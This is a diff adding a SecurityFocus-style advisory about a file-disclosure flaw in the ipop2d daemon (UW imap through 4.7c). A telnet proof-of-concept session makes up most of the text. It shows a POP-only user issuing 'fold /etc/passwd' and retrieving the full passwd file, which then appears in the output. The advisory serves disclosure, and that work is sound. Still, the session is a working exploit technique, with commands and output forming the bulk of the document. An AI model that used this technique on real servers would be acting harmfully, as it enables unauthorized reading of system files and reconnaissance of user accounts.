@@ -1,0 +1,70 @@
+source: http://www.securityfocus.com/bid/1484/info
+
+A vulnerability exists in versions of the ipop2d daemon, through version 4.55. ipop2d is part of the University of Washington imap package. Versions through 4.7c of the imap package are affected. Any user who has a pop account on the machine can view any world or group readable file on the file system. While on a shell account this is not a vulnerability, on a machine where a user only has POP access, this could result in the disclosure of information that might be useful in gaining information about other users on the system. This could in turn potentially be used to gain further access to the machine.
+
+For this vulnerability to exist, the user must have an account on the system in question. This account does not need shell level access.
+
+ipop2d, and the imap package, will run on many varieties of Unix and Unix-like operating systems.
+
+[mandark@mandark mandark]$ telnet localhost 109
+Trying 127.0.0.1...
+Connected to localhost.localdomain.
+Escape character is '^]'.
++ POP2 localhost.localdomain v4.46 server ready
+helo mandark blehpasshere
+#1 messages in /var/spool/mail/mandark
+read 1
+=389 characters in message 1
+retr 
+Return-Path: <root@mandark.jumpline.com>
+Received: (from root@localhost)
+by mandark.jumpline.com (8.10.1/8.10.1) id e6EGS7C27037
+for mandark@localhost; Fri, 14 Jul 2000 12:28:07 -0400 
+Date: Fri, 14 Jul 2000 12:28:07 -0400
+From: root <root@mandark.jumpline.com>
+Message-Id: <200007141628.e6EGS7C27037@mandark.jumpline.com>
+To: mandark@mandark.jumpline.com
+Status: RO
+
+message is here...
+
+acks
+=0 No more messages
+fold /etc/passwd 
+#1 messages in /etc/passwd
+read 1
+=1178 characters in message 1
+retr
+Date: Thu, 13 Jul 2000 16:50:07 -0400
+From: root@mandark.jumpline.com 
+Subject: /etc/passwd
+MIME-Version: 1.0 
+Content-Type: TEXT/PLAIN; charset=US-ASCII
+Status:
+
+root:x:0:0:root:/root:/bin/bash
+bin:x:1:1:bin:/bin:
+daemon:x:2:2:daemon:/sbin:
+lp:x:4:7:lp:/var/spool/lpd:
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/spool/mail:
+news:x:9:13:news:/var/spool/news:
+uucp:x:10:14:uucp:/var/spool/uucp:
+operator:x:11:0:operator:/root: 
+games:x:12:100:games:/usr/games:
+gopher:x:13:30:gopher:/usr/lib/gopher-data:
+ftp:x:14:50:FTP User:/home/ftp: 
+nobody:x:99:99:Nobody:/: 
+xfs:x:100:101:X Font Server:/etc/X11/fs:/bin/false
+postfix:x:101:104:postfix:/var/spool/postfix:
+gdm:x:0:0::/home/gdm:/bin/bash
+mandark:x:500:503::/home/mandark:/bin/bash
+godie:x:0:0::/home/godie:/bin/bash
+mp3:x:501:506::/mp3:/bin/bash
+chefo:x:502:507::/home/chefo:/bin/bash 
+crunch:x:503:508::/home/crunch:/bin/bash
+gsx:x:505:510::/home/gsx:/bin/csh
+matt:x:506:511::/home/matt:/bin/bash
+lyw0d:x:507:512::/home/lyw0d:/bin/bash
